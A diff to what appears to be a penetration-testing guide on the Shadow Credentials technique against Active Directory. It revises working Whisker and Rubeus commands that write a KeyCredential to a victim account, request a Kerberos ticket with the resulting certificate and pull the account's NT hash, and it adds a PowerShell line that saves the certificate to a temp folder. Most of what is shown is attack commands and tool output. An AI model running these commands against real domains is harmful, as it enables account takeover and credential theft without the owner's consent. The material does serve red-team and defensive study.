@@ -59,14 +59,14 @@ Whisker.exe remove /target:victimuser /domain:corp.local /dc:dc1.corp.local /dev
 Whisker.exe clear /target:victimuser /domain:corp.local /dc:dc1.corp.local
 ```
 
-Whisker output (add) includes the Rubeus command directly:
+Whisker output (add) includes the Rubeus command directly — Whisker prints the **full** base64-encoded PFX inline; the shortened form below is for readability only. Copy the actual command from your Whisker output:
 
 ```
 [*] KeyCredential generated with DeviceID 6fde5b51-a85b-473d-97e8-2c08b38e8c9f
 [+] Updated the msDS-KeyCredentialLink attribute of the target object
 [*] You can now run Rubeus with the following syntax:
 
-Rubeus.exe asktgt /user:victimuser /certificate:MIIJuAIBAzCC... /password:"kR4tDHLs5X0u9Dk" /domain:corp.local /dc:dc1.corp.local /getcredentials /show /nowrap
+Rubeus.exe asktgt /user:victimuser /certificate:<BASE64_PFX_FROM_WHISKER> /password:"kR4tDHLs5X0u9Dk" /domain:corp.local /dc:dc1.corp.local /getcredentials /show /nowrap
 ```
 
 ## pyWhisker (Linux / Python)
@@ -171,8 +171,10 @@ When PKINIT succeeds, the KDC embeds `PAC_CREDENTIAL_INFO` (containing the NT ha
 ### Windows (Rubeus) — included in Whisker output
 
 ```
+# Save the Whisker-issued PFX to disk first, then point /certificate at it:
+# [IO.File]::WriteAllBytes("C:\Windows\Temp\victim.pfx", [Convert]::FromBase64String("<BASE64_FROM_WHISKER>"))
 Rubeus.exe asktgt /user:victimuser \
-  /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCC... \
+  /certificate:C:\Windows\Temp\victim.pfx \
   /password:"kR4tDHLs5X0u9Dk" \
   /domain:corp.local \
   /dc:dc1.corp.local \
